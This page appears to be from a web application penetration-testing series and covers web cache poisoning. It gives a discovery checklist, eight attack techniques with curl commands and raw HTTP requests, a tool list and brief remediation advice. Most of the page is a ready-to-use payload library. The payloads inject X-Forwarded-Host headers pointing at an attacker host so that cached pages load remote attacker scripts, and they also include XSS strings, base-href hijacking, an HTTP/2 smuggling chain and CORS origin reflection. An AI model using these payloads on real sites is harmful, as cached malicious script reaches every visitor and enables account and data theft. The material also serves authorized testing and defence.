---
title: "Web Cache Poisoning"
date: 2026-02-24
draft: false
---

# Web Cache Poisoning

> **Severity**: High–Critical | **CWE**: CWE-346, CWE-116
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Is Web Cache Poisoning?

A cache stores responses keyed by URL + headers. Poisoning works by injecting malicious content into a **cached response** that is then served to all users requesting the same URL. Key concept: **cache key** (what identifies a unique cache entry) vs **unkeyed inputs** (headers/params that affect the response but aren't in the cache key).

```
Normal user:
  GET /?q=test HTTP/1.1
  Host: target.com
  → Response: normal content → cached as key: target.com/?q=test

Attacker:
  GET /?q=test HTTP/1.1
  Host: target.com
  X-Forwarded-Host: attacker.com    ← unkeyed header (not in cache key)
  → Response reflects: <script src="//attacker.com/evil.js"> → CACHED

Next user:
  GET /?q=test HTTP/1.1
  Host: target.com
  → Gets cached malicious response → XSS/redirect
```

---

## Discovery Checklist

- [ ] Identify caching infrastructure: Varnish, CloudFront, Nginx, Akamai, Fastly, Cloudflare, Squid
- [ ] Check for cache headers: `Cache-Control`, `X-Cache`, `Age`, `Cf-Cache-Status`, `X-Varnish`
- [ ] Use Param Miner (Burp) to discover unkeyed headers
- [ ] Test `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`
- [ ] Test unkeyed query parameters (cache ignores `?utm_source=`, `?callback=`, `?_=`)
- [ ] Test fat GET (body in GET request — some caches ignore body)
- [ ] Test `Vary` header — does cache vary on specific headers?
- [ ] Test HTTP method override (POST-to-GET via `X-HTTP-Method-Override`)
- [ ] Test path normalization: `/path` vs `/path/` vs `/path//`
- [ ] Verify poisoning by requesting without special headers (should get poisoned response)

---

## Payload Library

### Attack 1 — XSS via Unkeyed `X-Forwarded-Host`

```bash
# Test if X-Forwarded-Host affects response (reflected in URLs):
curl -s https://target.com/ \
  -H "X-Forwarded-Host: attacker.com" | grep -i "attacker"

# If reflected: poison with XSS payload host:
curl -s https://target.com/ \
  -H "X-Forwarded-Host: attacker.com\" onerror=\"alert(1)" | grep -i "attacker"

# Or: host a malicious script and inject it:
# Cache response with <script src="https://attacker.com/x.js">
curl -s https://target.com/ \
  -H "X-Forwarded-Host: attacker.com" -H "Cache-Control: no-cache"
# Then verify poison: request WITHOUT the header
curl -s https://target.com/ | grep -i "attacker"
```

### Attack 2 — Unkeyed Query Parameters

```bash
# Find parameters ignored by cache:
# Test: does adding ?utm_source=x get a different cache entry?

# utm_ parameters typically unkeyed:
curl -s "https://target.com/?utm_source=INJECTED" | grep -i "INJECTED"

# Callback parameters (JSONP):
curl -s "https://target.com/api/data?callback=INJECTED" | grep -i "INJECTED"
# If reflected: inject JS
curl -s "https://target.com/api/data?callback=alert(1)//" | grep -i "alert"

# Common unkeyed params to test:
?utm_source=evil
?utm_medium=evil
?utm_campaign=evil
?ref=evil
?_=evil
?nocache=evil
?v=evil
?callback=evil
?jsonp=evil

# Verify cache: send without param → should still get poisoned response
```

### Attack 3 — Fat GET Body Injection

```bash
# Some caches key on URL only, but app reads GET body too:
# Body-based parameter override:
GET / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

param=CACHE_BUST_PAYLOAD_HERE

# Test with Burp Repeater:
# Send GET with body — if response reflects body content:
# → Cache keyed on URL only → poison the URL's cache entry
```

### Attack 4 — Cache Key Normalization Issues

```bash
# Path normalization — different path, same cache entry:
/about     → cached
/About     → same cache entry? (case-insensitive)
/about/    → same entry? (trailing slash)
/about//   → same entry?
/about;param=x  → semicolon handling

# Delimiter confusion:
/api/users?role=user;admin    # semicolon as secondary delimiter
/api/users?role=user%3badmin  # URL-encoded semicolon

# Exploit: poison /about/ but all requests to /about get poisoned response
curl -s "https://target.com/about/" \
  -H "X-Forwarded-Host: attacker.com"
# Verify: request /about (without slash) → poisoned?
```

### Attack 5 — Scheme Poisoning

```bash
# X-Forwarded-Scheme injection — some caches don't key on this:
curl -s "https://target.com/" \
  -H "X-Forwarded-Scheme: http" \
  -H "X-Forwarded-Host: attacker.com"

# If app generates URLs based on scheme:
# Response includes: <base href="http://attacker.com/">
# → All relative URLs now load from attacker.com

# Test variants:
X-Forwarded-Proto: http
X-Forwarded-Protocol: http
X-Url-Scheme: javascript
```

### Attack 6 — Cache Deception Difference (Confusion)

```bash
# Requests that include a static extension path are aggressively cached:
# If /account/profile is dynamic but:
# /account/profile.css is treated as static and cached
# → Access /account/profile.css → cache stores authenticated user data
# → Other users request /account/profile.css → get victim's data
# (This is Cache Deception — see 63_CacheDeception.md)

# Here: Cache Poisoning via path confusion:
# GET /account/../static/main.js HTTP/1.1  → resolved to /static/main.js
# But cache key is: /account/../static/main.js
# → Poison the "static" asset's cache entry with dynamic user data
```

### Attack 7 — Vary Header Bypass

```bash
# Cache uses Vary: Accept-Encoding or Vary: Accept-Language
# Test: does changing Accept-Language affect response?
curl -s "https://target.com/" -H "Accept-Language: de" | grep -i "de\|german"

# If Accept-Language is unkeyed but affects response:
# Inject script in language parameter that doesn't exist:
Accept-Language: "><script>alert(1)</script>
Accept-Language: de, <script>alert(1)</script>

# If origin in Vary is ignored:
Origin: https://attacker.com
# But app reflects it in: Access-Control-Allow-Origin: https://attacker.com
# → Cache stores CORS-allowed response for attacker.com for all users
```

### Attack 8 — HTTP/2 Request Smuggling → Cache Poison

```bash
# Combine smuggling with cache poisoning:
# Smuggle a request that poisons the cache for another URL

POST / HTTP/2
Host: target.com
Content-Length: 0

GET /home HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Length: 5

x=1

# The smuggled GET /home gets processed with X-Forwarded-Host: attacker.com
# Response gets cached under /home → all users get XSS
```

---

## Tools

```bash
# Param Miner (Burp extension — essential):
# BApp Store → Param Miner
# Right-click request → Extensions → Param Miner → Guess Headers/Params
# Discovers unkeyed inputs automatically

# wcvs — web cache vulnerability scanner:
git clone https://github.com/nicowillis/wcvs

# Web-Cache-Vulnerability-Scanner:
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
web-cache-vulnerability-scanner -u https://target.com/

# Manual cache poisoning workflow with curl:
# 1. Test if X-Forwarded-Host is reflected:
curl -s "https://target.com/" -H "X-Forwarded-Host: CANARY" | grep CANARY

# 2. Poison the cache:
curl -s "https://target.com/" -H "X-Forwarded-Host: attacker.com" \
  -H "Cache-Control: no-cache"

# 3. Verify poison served from cache:
curl -s "https://target.com/" | grep "attacker.com"
# Also check: X-Cache: HIT

# Detect cache headers:
curl -sI "https://target.com/" | grep -iE "x-cache|age|cf-cache|via|server"

# Cloudflare cache status:
# CF-Cache-Status: HIT = served from cache
# CF-Cache-Status: MISS = not cached
# CF-Cache-Status: DYNAMIC = not eligible for caching
```

---

## Remediation Reference

- **Cache keying**: include all request headers that affect response content in the cache key
- **`Vary` header**: use `Vary: *` to prevent caching of responses that differ per-user
- **Strip dangerous headers before caching**: remove `X-Forwarded-Host`, `X-Forwarded-Scheme` at CDN/proxy edge
- **Never reflect unvalidated headers** in responses that may be cached
- **Cache-Control on sensitive responses**: `Cache-Control: no-store, private` for authenticated/personalized content
- **Separate caching tiers**: static assets cacheable; dynamic/authenticated responses must not be cached
- **Audit CDN configuration**: verify which headers are keyed, which vary headers are respected

*Part of the Web Application Penetration Testing Methodology series.*
